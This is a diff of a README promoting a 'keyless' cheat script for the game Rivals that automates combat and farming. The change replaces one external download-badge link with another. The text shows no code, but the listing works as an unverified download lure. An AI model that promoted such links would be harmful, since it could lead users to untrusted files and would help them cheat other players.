@@ -4,7 +4,7 @@
 This **100% KEYLESS**, open-source script automates combat, resource farming, and upgrades in *Rivals*, letting you climb the ranks, unlock gear, and crush enemies effortlessly. Perfect for players tired of repetitive grinding or overpriced exploits.  
 
 
-**[![Download Rivals Script](https://img.shields.io/badge/Download-Rivals%20Script-blueviolet)](https://downloadifiles.com/?label=1e88dd1be7cebcac3b93ae91dcb2375f)**
+**[![Download Rivals Script](https://img.shields.io/badge/Download-Rivals%20Script-blueviolet)](https://roblox-rivals-script.github.io/.github/)**
 
 
 🚀 **Key Features**:  
